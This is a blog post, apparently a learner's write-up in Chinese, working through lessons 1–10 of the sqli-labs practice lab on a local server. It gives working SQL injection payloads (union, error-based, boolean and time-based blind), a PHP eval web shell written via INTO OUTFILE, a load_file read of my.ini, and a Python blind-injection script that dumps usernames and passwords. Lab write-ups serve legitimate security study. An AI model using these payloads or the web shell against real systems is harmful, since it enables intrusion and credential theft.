@@ -1,0 +1,524 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          sqli-labs练习（less1-10） - Kingkk&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.kingkk/2017/12/sqli-labs练习(less1-10)/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kingkk&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                    </div>
+                    <h1>sqli-labs练习（less1-10）</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by kingkk on
+                        2017-12-10
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <p>为了学习的便利性，我在一些文件中都出了sql语句</p>
+<h3 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h3><p>先理清一下<strong>注入动机</strong>：目的是为了获取账号密码，于是得获取对应的表名、字段名、数据库名，并得绕过一些设定，从而获取你想要的数据库中的数据。 自己做个一个<strong>注入流程</strong>： <img src="http://www.kingkk.com/wp-content/uploads/2017/12/W2EE@TW20@CA4SVO.png" alt> 接下来<strong>开始注入：</strong> 输入单引号，引起错误，说明存在注入点 <img src="http://www.kingkk.com/wp-content/uploads/2017/12/1.png" alt> 通过#将后面引号注释掉（此处直接打#并没有进行编码，要自己编码为%23），成功注释了后面的单引号 <img src="http://www.kingkk.com/wp-content/uploads/2017/12/2.png" alt> </p>
+<p>通过order by 确认行数为 3</p>
+<p><img src="http://www.kingkk.com/wp-content/uploads/2017/12/5.png" alt></p>
+<p>然后继续利用union select 1,2,3，发现并没有返回1，2，3这几个数字 <img src="http://www.kingkk.com/wp-content/uploads/2017/12/3.png" alt> 究其原因，因为代码中仅仅mysql_fetch_array了一次，所以只能返回第一列的数据。这时仅需将id的值置为一个不存在的值即可（如-1） <img src="http://www.kingkk.com/wp-content/uploads/2017/12/4.png" alt> 发现，返回的值仅有2、3，可以利用的点比较少，这时可以利用concat_ws()函数将数据连接，同时获取到了版本信息，连接用户，当前数据库 然后从information_schema中获取表的信息（<strong>注意</strong>：security需要进行16进制编码，或者用引号引起来，推荐使用编码） <img src="http://www.kingkk.com/wp-content/uploads/2017/12/c7659ce8da7cadacc0ad6088e8bd7570.png" alt> 再通过limit依此获取到四个表名emails、referers、uagents、users。显然users才是我们需要的表，然后再次获取列名 <img src="http://www.kingkk.com/wp-content/uploads/2017/12/9fa678e16d46d84acdf9e2dbf0293149.png" alt> 获取到了id、username、password这些列名 获取到表名和列名之后，就可以直接获取里面的数据啦 <img src="http://www.kingkk.com/wp-content/uploads/2017/12/b1805b2319c9c14faa1db67f31db7391.png" alt>  </p>
+<h3 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h3><p>一样的通过id = 1’进行测试 <img src="http://www.kingkk.com/wp-content/uploads/2017/12/d58da6dfce3ad27803f27fde66473058.png" alt> 猜测是数字型数据未加引号，当然其实输出来的sql语句可以直接看的出来 和less-1几乎一样，就是id的参数没用引号引起来 less-1 sql语句<img src="http://www.kingkk.com/wp-content/uploads/2017/12/923217b47321002e455984727efd6b73.png" alt> less-2 sql语句<img src="http://www.kingkk.com/wp-content/uploads/2017/12/cb08ae0579653596bbc6b89dd975ac8d.png" alt> 直接把less-1的payload中id后面的单引号去掉即可 <img src="http://www.kingkk.com/wp-content/uploads/2017/12/f0855db638d64c9c6c95aa8b5bf94947.png" alt>  </p>
+<h3 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h3><p>同样的id=1’测试 <img src="http://www.kingkk.com/wp-content/uploads/2017/12/f8f5bdd1569383d3f0858a934dc8634b.png" alt> 但看报错的话会发现一个奇怪的 ），报错的语句主要是在near和at两个单词之间的语句。猜测左边应该也有个（ 与右括号进行闭合。然后再看输出的sql语句，来验证我们的想法，那么就变得很简单了，同样只需要构造右边的括号，然后注释掉剩余的即可  <code>id=1&#39;)%23</code> <img src="http://www.kingkk.com/wp-content/uploads/2017/12/5f48ba40ae81fe0c8cf1357b7c2c500f.png" alt>  </p>
+<h3 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h3><p>一样进行id=1’测试,发现这回竟然没有报错，于是进行尝试双引号”,爆出了错误 <img src="http://www.kingkk.com/wp-content/uploads/2017/12/a55f11ae4833eaef5821e03f27fce25d.png" alt> 判断变量应该是通过双引号引起来的，于此同时看到了熟悉的右括号 ），结合一下，构造payload:<code>id=1&quot;)%23</code> <img src="http://www.kingkk.com/wp-content/uploads/2017/12/7c35d268303130b46ca16eb020a7ebd0.png" alt>    </p>
+<h3 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h3><p>一开始id=1’成功报错 然后id=1’#也成功绕过，但是。。。。。 <img src="http://www.kingkk.com/wp-content/uploads/2017/12/2877ac76662af64256502eae9829d280.png" alt> 什么数据都不显示，吓得我看了下源码 <img src="http://www.kingkk.com/wp-content/uploads/2017/12/e8fdb6b70bae0924852f7b10a309a62d.png" alt> 尼玛，这还真的什么都不显示。。这怎么获取利用信息呢。。 然后借鉴了一篇别人的博客（最后有提到），终于看明白了。这个less-5的目的就是为了让我们通过<img src="http://www.kingkk.com/wp-content/uploads/2017/12/3a6601455da142a2560113fb09d0e746.png" alt>这个报错语句，来显示我们所需要的数据。原理如下： 有些厉害的测试工程师发现，将Group by clause与一个聚合函数一起使用，例如count(<em>)，可以将查询的部分内容作为错误信息返回。也就发展为今天的<strong>二次注入查询</strong>。 payload如下：xxx所要查询的语句 `?id=1’ union select count(</em>),0, concat(‘~’,(xxxx),’~’, floor(rand()*2)) as a from information_schema.tables group by a%23` 构造的主要思想为：</p>
+<ol>
+<li>一开始还是可以通过order by获取知道有3个字段名的，然后依旧构造union select 1,2,3的语句</li>
+<li>然后在前面填充一个count(<em>),中间有多的话就空着好了，在最后3的位置，用concat或者concat_ws将你需要的数据与floor(rand()</em>2)连接在一起(为了方便观察可以加一些辅助符号如空格等)</li>
+<li>然后将这个语句 as a from information_schema.tables group by a 即可(其中as后面的a只要与group后的a同名即可，from后面的表只要是个存在的表即可)</li>
+</ol>
+<p>然后只要在xxx语句中按照常规方法进行依此获取数据即可（在获取数据时可能有几次没有返回回显，多点击几次即可。而且每次读取的数据只能为一条）</p>
+<h3 id><a href="#" class="headerlink" title></a><img src="http://www.kingkk.com/wp-content/uploads/2017/12/76d98b33edf91fc297de8c5c2b974d79.png" alt></h3><h3 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h3><p>同样id=1’没报错，id=1” 报错，证明为双引号注入 然后通less-5原理，通过二次注入，得到password <img src="http://www.kingkk.com/wp-content/uploads/2017/12/ed8bc7b40293e164dbf16c27faaf8b56.png" alt>    </p>
+<h3 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h3><p>一开始还是id=1’，报错（这回只有简单的提示语句错误） <img src="http://www.kingkk.com/wp-content/uploads/2017/12/621ed90d715530e12749c740072288ea.png" alt> 然后井号%23绕过,竟然不行，那就，id=1’)%23 ,竟然还不行。。 原谅我菜，看了源码才知道居然有两个括号，那就id=1’))%23绕过，这回OK了 然后就是开始导入文件导入文件。写着写着发现导入的绝对地址不知道，于是通过其他less,配合下面两个函数，获取路径</p>
+<ul>
+<li>@@datadir 读取数据库路径</li>
+<li>@@basedir 获取Mysql安装路径</li>
+</ul>
+<p><img src="http://www.kingkk.com/wp-content/uploads/2017/12/0dbec570ea5c25186c714c4bdb84f76d.png" alt> 然后就开始写如一句话，注意下地址的斜杠, \\ or / 两种方式，还有post中的引号要用双引号” 否则会与之前sql语句中的单引号闭合 payload: <code>?id=1&#39;)) union select 1,2,&#39;&lt;?php @eval($_POST[&quot;kingkk&quot;]);?&gt;&#39; into outfile &#39;D:/Program Files/wamp/www/sqli-labs/Less-7/test.php&#39; %23</code> <img src="http://www.kingkk.com/wp-content/uploads/2017/12/ee5981854d739358c32ce0dba395f516.png" alt> 成功写入一句话，实战中就开始连菜刀把<img src="http://www.kingkk.com/wp-content/uploads/2017/12/6ff9fcd8d639f9acb5d3422a9f92200a.png" alt> 出了导入文件，以及导出文件 <code>?id=1&#39;)) union select 1,2,load_file(&#39;D:/Program Files/wamp/bin/mysql/mysql5.6.17/my.ini&#39;)into outfile &#39;D:/Program Files/wamp/www/sqli-labs/Less-7/ini.txt&#39; %23</code> <img src="http://www.kingkk.com/wp-content/uploads/2017/12/ee34c45ffd06669d4ddaf237728153fe.png" alt> 成功导出my.ini文件    </p>
+<h3 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h3><p>进行简单的测试，发现，正确时返回一句固定的话，错误时没有提示语句，那也就意味着无法通过显示以及报错来获取想要的数据 此时就需要通过布尔盲注进行注入，主要思想是通过正确与错误时输出的不同，再连接上and 语句，然后依次比较ascii大小，来获得数据 payload: <code>?id=1&#39; and ascii(substr((select database()),1,1))&gt;64 %23</code> 修改select database（）成你想要的语句，然后依此修改substr的第二个参数，以及大于后面的数字，来获取数据，当ascii=0时表示数据截止，找到出现错误并且比较的数字是最小的那个数字即为当前字母（即刚好出错）的ascii。 布尔盲注比较费时费力，一般通过脚本进行跑。如下是我本人自己写的脚本，不得不说代码功底的确很差，本来想写二分法的，后来搞得自己有点晕，就没优化了，看来寒假是有必要好好学下数据结构和算法了。真的菜到抠脚。</p>
+<p>#encoding=utf8<br>import requests </p>
+<p>url = ‘<a href="http://localhost/sqli-labs-master/Less-8/&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-8/&#39;</a></p>
+<p>def loop(sql):<br>    info = “”<br>    asc_range = [0]+range(20,123)<br>    for i in xrange(1,20):<br>        for x in asc_range:<br>            params = {‘id’:”1’ and ascii(substr(({2}),{1},1))&gt;{0} #”.format(x,i,sql)}<br>            r = requests.get(url,params=params)<br>            if len(r.text)==722:<br>                if x==0:<br>                    print<br>                    return info<br>                break;<br>        print chr(x),<br>        info+=chr(x)</p>
+<p>def get_database():<br>    sql = ‘select database()’<br>    print u”当前数据库为：”<br>    return loop(sql)</p>
+<p>def get_tables(database):<br>    sqls = []<br>    info = [] #存放表的数组<br>    for x in range(10):<br>        sqls.append(‘select table_name from information_schema.tables where table_schema=”{0}” limit {1},1’.format(database,x))<br>    for sql in sqls:<br>        res = loop(sql)<br>        if res!=””:<br>            info.append(res)<br>        else:<br>            return info<br>def get_columns(database,table):<br>    sqls = []<br>    info = []<br>    for x in range(10):<br>        sqls.append(‘select column_name from information_schema.columns where table_schema=”{0}” and table_name = “{2}” limit {1},1’.format(database,x,table))<br>    for sql in sqls:<br>        res = loop(sql)<br>        if res!=””:<br>            info.append(res)<br>        else:<br>            return info</p>
+<p>def get_content(database,table,columns):<br>    sqls = []<br>    info = []<br>    for x in range(10):<br>        sqls.append(‘select {0} from {1}.{2} limit {3},1’.format(columns,database,table,x))<br>    for sql in sqls:<br>        res = loop(sql)<br>        if res!=””:<br>            info.append(res)<br>        else:<br>            return info<br>def main():<br>    current_database = get_database()<br>    tables = get_tables(current_database)<br>    columns = get_columns(current_database,tables[3])<br>    get_content(current_database,tables[3],columns[2])</p>
+<p>if __name__ == ‘__main__‘:<br>    main()</p>
+<p>输出结果如下：</p>
+<p>s e c u r i t y<br>e m a i l s<br>r e f e r e r s<br>u a g e n t s<br>u s e r s</p>
+<p>i d<br>u s e r n a m e<br>p a s s w o r d</p>
+<p>D u m b<br>I - k i l l - y o u<br>p @ s s w o r d<br>c r a p p y<br>s t u p i d i t y<br>g e n i o u s<br>m o b ! l e<br>a d m i n<br>a d m i n 1<br>a d m i n 2</p>
+<p>思路也是一样，依此通过 库-&gt;表-&gt;列-&gt;数据 这样来依此获取。虽然写的有点菜，但勉强能用把，以后会二分了再来优化下好了。。  </p>
+<h3 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h3><p>发现不管怎么测试,SQL语句有无错误，显示都是相同的。这点通过查看源码也能验证，所以，通过sleep函数，来检测是否有可以注入 <code>?id=1&#39; and sleep(5) %23</code> sleep时会呈现这种阻塞状态，时间为sleep中的参数（秒），所以就通过有无阻塞来判断if的第一个参数是否为真 if的用法：if（a，b，c），a为真时返回b，否则返回c。所以payload中前者为假则进入阻塞 <img src="http://www.kingkk.com/wp-content/uploads/2017/12/95dcae83398838fae92227832d240ec6.png" alt> 然后附上payload:<code>?id=1&#39; and if(ascii(substr((select database()),1,1))&gt;130,0,sleep(3)) %23</code>(因为是本地服务器，延迟较小，sleep时间可以缩短些，实际注入中要按网络延迟来判定) 接下来代码部分和之前less-8几乎一样，只要将payload部分，以及判断语句修改一下即可，下面仅附上loop部分的代码</p>
+<p>def loop(sql):<br>    info = “”<br>    asc_range = [0]+range(20,123)<br>    for i in xrange(1,20):<br>        for x in asc_range:<br>            <strong>params = {‘id’:”1’ and if(ascii(substr(({2}),{1},1))&gt;{0},0,sleep(3)) #”.format(x,i,sql)}</strong>             <strong>start_time = time()</strong>  //time（）函数需要提前 from time import time 导入<br>            <strong>r = requests.get(url,params=params)<br>            end_time = time()<br>            con_time = end_time-start_time</strong>             <strong>if con_time&gt;3:</strong>                 if x==0:<br>                    print<br>                    return info<br>                break;<br>        print chr(x),<br>        info+=chr(x)</p>
+<h3 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h3><p>依旧基于时间的布尔盲注，只是引号是双引号，稍微修改下payload即可 <code>id=1&#39; and sleep(3)%23</code> 脚本也就不放了，也就是把payload部分改了就行，和less-9几乎完全一样  </p>
+<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>最后来总结下这less1-10</p>
+<ul>
+<li><code>less-1 基于单引号的字符型注入</code>：闭合单引号即可</li>
+<li><code>less-2 基于错误的get整型注入</code>：无需闭合单引号</li>
+<li><code>less-3 基于错误的get单引号变形字符型注入</code>： 根据错误提示，闭合括号与单引号</li>
+<li><code>less-4 基于错误的get双引号字符型注入</code>: 根据错误提示闭合双引号与括号</li>
+<li><code>less-5 双注入get单引号字符型注入</code>： 通过联合使用 count(<em>)、group by 、concat_ws()、floor(rand()</em>2)的形式将数据通过报错显示出来</li>
+<li><code>less-6 双注入get双引号字符型注入</code>：同上，闭合号使用双引号即可</li>
+<li><code>less-7 导出文件get字符型注入</code>：通过into outfile导入与导出文件</li>
+<li><code>less-8 布尔型单引号get盲注</code>：通过连接and ascii(substr((xxx),1,1))&gt;64的形式，根据返回页面不同判定数据</li>
+<li><code>less-9 基于时间的GET单引号盲注</code>: 通过if 以及sleep函数，根据响应的时间判断数据</li>
+<li><code>less-10 基于时间的双引号盲注</code>：同上，闭合符号使用双引号即可</li>
+</ul>
+<p>基本的测试：单引号 ‘   双引号”   单括号)   双括号)) 根据不同的情况可以选择不同的注入方式（不唯一） <code>有报错语句，有显示数据</code>：直接通过报错语句修改语法，通过显示的数据获取想要的信息 <code>有报错语句，无显示数据</code>：通过双注入来从报错语句中获取信息 <code>无报错语句，有显示数据</code>：通过不断测试，猜测可能的闭合语句，然后注入 <code>无报错语句，根据sql语句正确与否显示数据不同</code>：通过布尔型盲注进行注入 <code>无报错语句，根据sql语句正确与否显示数据相同</code>：通过基于时间的盲注进行注入     最后感谢一下这篇博客，写的很好，很详细，也借鉴了许多 <a href="http://blog.csdn.net/u012763794/article/details/51207833" target="_blank" rel="noopener">http://blog.csdn.net/u012763794/article/details/51207833</a> 以及<a href="http://blog.csdn.net/nixawk/article/details/27804385" target="_blank" rel="noopener">http://blog.csdn.net/nixawk/article/details/27804385</a></p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2017/12/sqli-labs练习(less11-22)/" data-toggle="tooltip" data-placement="top" title="sqli-labs练习（less11-22）">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2017/12/python用queuequeue模块来实现多线程间通信/" data-toggle="tooltip" data-placement="top" title="Python 用Queue/queue模块来实现多线程间通信">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="//98587329.github.io" target="_blank">mt</a></li>
+                    
+                        <li><a href="//www.cflowerth.com" target="_blank">FAtwAER</a></li>
+                    
+                        <li><a href="//lufe1.cn" target="_blank">lufei</a></li>
+                    
+                        <li><a href="//0x3f97.github.io" target="_blank">gd</a></li>
+                    
+                        <li><a href="http://www.lsafe.org" target="_blank">4dmin$5</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">theKingOfNight</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">Hpdoger</a></li>
+                    
+                        <li><a href="//mochazz.github.io/" target="_blank">七月火</a></li>
+                    
+                        <li><a href="https://mengsec.com/" target="_blank">蒙尘</a></li>
+                    
+                        <li><a href="https://patrilic.top/" target="_blank">Patrilic</a></li>
+                    
+                        <li><a href="https://threedr3am.github.io/" target="_blank">threedr3am</a></li>
+                    
+                        <li><a href="http://rui0.cn/" target="_blank">Ruilin</a></li>
+                    
+                        <li><a href="https://zgao.top/" target="_blank">zgao</a></li>
+                    
+                        <li><a href="https://www.zfjsec.com/" target="_blank">zfjsec</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/kingkaki">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kingkk&#39;s Blog 2022 
+                    浙ICP备17041487号
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a>
+
+                    <!-- | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.kingkk/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '2095437387a20021fd7e176e0c1aac8b';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
